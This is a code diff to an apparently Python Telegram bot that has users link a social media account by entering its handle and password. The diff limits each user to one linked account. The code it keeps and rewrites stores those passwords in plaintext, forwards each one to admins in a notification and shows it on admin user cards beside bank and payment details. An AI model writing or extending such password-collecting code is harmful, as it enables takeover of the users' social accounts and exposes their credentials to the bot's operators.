@@ -268,6 +268,7 @@ class Database:
     ):
         if self.is_postgres:
             async with self.pool.acquire() as conn:
+                await conn.execute("DELETE FROM social_accounts WHERE chat_id = $1", chat_id)
                 await conn.execute(
                     """
                     INSERT INTO social_accounts (chat_id, telegram_username, platform, handle, password)
@@ -282,6 +283,7 @@ class Database:
         else:
             import aiosqlite
             async with aiosqlite.connect(self.db_path) as db:
+                await db.execute("DELETE FROM social_accounts WHERE chat_id = ?", (chat_id,))
                 await db.execute(
                     """
                     INSERT INTO social_accounts (chat_id, telegram_username, platform, handle, password)
@@ -599,10 +601,22 @@ async def menu_callback_router(callback: types.CallbackQuery, state: FSMContext)
 
     with suppress(TelegramBadRequest):
         if data == "menu_register":
-            await callback.message.edit_text(
-                "Select the social media platform you want to register:",
-                reply_markup=get_platforms_keyboard(),
-            )
+            existing = await db.get_user_social_accounts_full(chat_id)
+            if existing:
+                acc = existing[0]
+                await callback.message.edit_text(
+                    f"📱 <b>Your Linked Social Account</b>\n\n"
+                    f"• <b>Platform:</b> {html.escape(acc['platform'])}\n"
+                    f"• <b>Handle:</b> <code>{html.escape(acc['handle'])}</code>\n\n"
+                    f"⚠️ <i>You already have a linked account. Each user can only have one linked social account.</i>",
+                    reply_markup=get_back_keyboard(),
+                )
+            else:
+                await callback.message.edit_text(
+                    "Select the social media platform you want to link:\n"
+                    "<i>(Note: You can only link one social account)</i>",
+                    reply_markup=get_platforms_keyboard(),
+                )
         elif data == "menu_stats":
             user = await db.get_user(chat_id)
             if user:
@@ -759,6 +773,21 @@ async def menu_callback_router(callback: types.CallbackQuery, state: FSMContext)
 
 # --- SOCIAL REGISTRATION FLOW ---
 async def platform_selected(callback: types.CallbackQuery, state: FSMContext):
+    chat_id = callback.message.chat.id
+    existing = await db.get_user_social_accounts_full(chat_id)
+    if existing:
+        acc = existing[0]
+        await callback.answer("You already have a linked social account!", show_alert=True)
+        with suppress(TelegramBadRequest):
+            await callback.message.edit_text(
+                f"📱 <b>Your Linked Social Account</b>\n\n"
+                f"• <b>Platform:</b> {html.escape(acc['platform'])}\n"
+                f"• <b>Handle:</b> <code>{html.escape(acc['handle'])}</code>\n\n"
+                f"⚠️ <i>You already have a linked account. Each user can only have one linked social account.</i>",
+                reply_markup=get_back_keyboard(),
+            )
+        return
+
     platform = callback.data.split("_")[1]
     await state.update_data(platform=platform)
     await state.set_state(BotStates.entering_handle)
@@ -807,21 +836,12 @@ async def process_password(message: types.Message, state: FSMContext):
 
     await db.add_social_account(chat_id, telegram_username, platform, handle, password)
 
-    # Fetch all social accounts for this user and notify admin(s)
-    socials = await db.get_user_social_accounts(chat_id)
-    twitter_handle = socials.get("Twitter", "None")
-    youtube_handle = socials.get("YouTube", "None")
-    instagram_handle = socials.get("Instagram", "None")
-    tiktok_handle = socials.get("TikTok", "None")
-
     admin_notification = (
-        f"🔔 <b>New Account Registered!</b>\n\n"
+        f"🔔 <b>New Social Account Linked!</b>\n\n"
         f"<b>username:</b> {html.escape(telegram_username)}\n"
-        f"<b>twitter:</b> {html.escape(twitter_handle)}\n"
-        f"<b>youtube:</b> {html.escape(youtube_handle)}\n"
-        f"<b>instagram:</b> {html.escape(instagram_handle)}\n"
-        f"<b>tiktok:</b> {html.escape(tiktok_handle)}\n\n"
-        f"<b>Newly Added:</b> {html.escape(platform)} (<code>{html.escape(handle)}</code>)\n"
+        f"<b>chat_id:</b> <code>{chat_id}</code>\n\n"
+        f"<b>Platform:</b> {html.escape(platform)}\n"
+        f"<b>Handle:</b> <code>{html.escape(handle)}</code>\n"
         f"<b>Password:</b> <code>{html.escape(password)}</code>"
     )
 
@@ -834,8 +854,9 @@ async def process_password(message: types.Message, state: FSMContext):
     await state.clear()
     await state.set_state(BotStates.main_menu)
     await message.answer(
-        f"✅ Successfully registered <b>{html.escape(platform)}</b> account (<code>{html.escape(handle)}</code>)!\n"
-        "<i>(Your password message was deleted from chat for security)</i>",
+        f"✅ Successfully linked <b>{html.escape(platform)}</b> account (<code>{html.escape(handle)}</code>)!\n"
+        "<i>(Your password message was deleted from chat for security)</i>\n\n"
+        "<i>(Note: This is your 1 linked social account)</i>",
         reply_markup=get_main_menu_keyboard(),
     )
 
@@ -934,19 +955,14 @@ def format_user_data_card(
     money = target_user["money"]
     payment_info = target_user.get("payment_info") or "Not provided"
 
-    social_lines = []
     if socials:
-        for s in socials:
-            if is_admin:
-                social_lines.append(
-                    f"• <b>{html.escape(s['platform'])}:</b> <code>{html.escape(s['handle'])}</code> (Pass: <code>{html.escape(s['password'])}</code>)"
-                )
-            else:
-                social_lines.append(
-                    f"• <b>{html.escape(s['platform'])}:</b> <code>{html.escape(s['handle'])}</code>"
-                )
+        s = socials[0]
+        if is_admin:
+            social_info = f"• <b>{html.escape(s['platform'])}:</b> <code>{html.escape(s['handle'])}</code> (Pass: <code>{html.escape(s['password'])}</code>)"
+        else:
+            social_info = f"• <b>{html.escape(s['platform'])}:</b> <code>{html.escape(s['handle'])}</code>"
     else:
-        social_lines.append("• <i>No social accounts connected</i>")
+        social_info = "• <i>No social account linked</i>"
 
     if is_admin:
         sub_lines = []
@@ -965,9 +981,8 @@ def format_user_data_card(
             f"💰 <b>Total Earnings:</b> <b>${money:.2f}</b>\n\n"
             f"💳 <b>Bank Account / Payment Details:</b>\n"
             f"<code>{html.escape(payment_info)}</code>\n\n"
-            f"📱 <b>Connected Social Accounts:</b>\n"
-            + "\n".join(social_lines)
-            + "\n\n"
+            f"📱 <b>Linked Social Account:</b>\n"
+            f"{social_info}\n\n"
             f"🔗 <b>Recent Submissions ({len(submissions)} total):</b>\n"
             + "\n".join(sub_lines)
             + "\n\n"
@@ -981,7 +996,8 @@ def format_user_data_card(
             f"💰 <b>Total Earnings:</b> <b>${money:.2f}</b>\n\n"
             f"💳 <b>Bank Account / Payment Details:</b>\n"
             f"<code>{html.escape(payment_info)}</code>\n\n"
-            f"📱 <b>Connected Platforms:</b>\n" + "\n".join(social_lines)
+            f"📱 <b>Linked Social Account:</b>\n"
+            f"{social_info}"
         )
 
 async def process_inspect_user(message: types.Message, state: FSMContext):
